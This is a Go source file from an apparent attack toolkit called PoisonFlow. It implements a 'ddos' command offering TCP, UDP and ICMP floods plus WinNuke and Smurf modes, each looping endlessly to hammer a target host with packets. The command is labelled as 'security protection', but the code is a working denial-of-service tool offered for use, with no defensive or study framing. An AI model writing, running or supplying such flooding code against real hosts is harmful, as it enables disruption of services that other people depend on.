package flow

import (
	"PoisonFlow/src/utils"
	"fmt"
	"github.com/sirupsen/logrus"
	"github.com/spf13/cobra"
	"net"
	"os"
	"os/signal"
	"strings"
	"syscall"
	"time"
)

var (
	// DDOS 执行方法
	DDOS = &cobra.Command{
		Use:   "ddos [tab][tab]",
		Short: "安全防护",
		Long:  ``,
		Run: func(cmd *cobra.Command, args []string) {
			config := utils.Check.CheckDDos(&utils.Config)
			ddos := NewPacket()
			ddos.Execute(config)
		},
	}
)

var (
	pkt int
)

type Packet struct {
}

func (p *Packet) Execute(config *utils.ProtoAPP) {
	var address = fmt.Sprintf("%s:%d", config.Host, config.Port)
	logrus.Println("Starting Target IP: " + config.Host)
	switch config.Mode {
	case "TCP":
		p.TCPFlood(address)
	case "UDP":
		p.UDPFlood(address)
	case "ICMP":
		p.ICMPFlood(config.Host)
	case "WinNuke":
		var address = fmt.Sprintf("%s:%d", config.Host, 139)
		p.TCPFlood(address)
	case "Smurf":
		if strings.HasSuffix(config.Host, "255") {
			p.ICMPFlood(config.Host)
		}
		logrus.Errorf("Please check format of Smurf host : 192.168.255.255")
	default:
		utils.Check.CheckExit("Please check format of ddos mode : TCP、UDP、ICMP")
	}
}

func (p *Packet) ICMPFlood(host string) {
	p.SendPacket("ip4:icmp", host)
}

func (p *Packet) UDPFlood(address string) {
	p.SendPacket("udp", address)
}

func (p *Packet) TCPFlood(address string) {
	p.SendPacket("tcp", address)
}

func (p *Packet) SendPacket(mode, address string) {
	// 捕获ctrl+c
	c := make(chan os.Signal, 1)
	signal.Notify(c, syscall.SIGINT, syscall.SIGTERM)
	// 3秒中
	ticker := time.NewTicker(3 * time.Second)
	defer ticker.Stop()
	// 协程输出发送pps
	go func() {
		for range ticker.C {
			logrus.Printf("Send %d packets in ((%.2f  pps)\n", pkt, float64(pkt/1.0))
		}
	}()
	// 发送数据包
	for {
		select {
		// 捕获ctrl + c
		case _ = <-c:
			logrus.Printf("stopped sending a total of %d packets", pkt)
			os.Exit(0)
		default:
			conn, err := net.DialTimeout(mode, address, time.Millisecond*300)
			utils.Check.CheckError(err)
			_, _ = conn.Write([]byte(address))
			pkt++
		}
	}
}

func NewPacket() *Packet {
	return &Packet{}
}
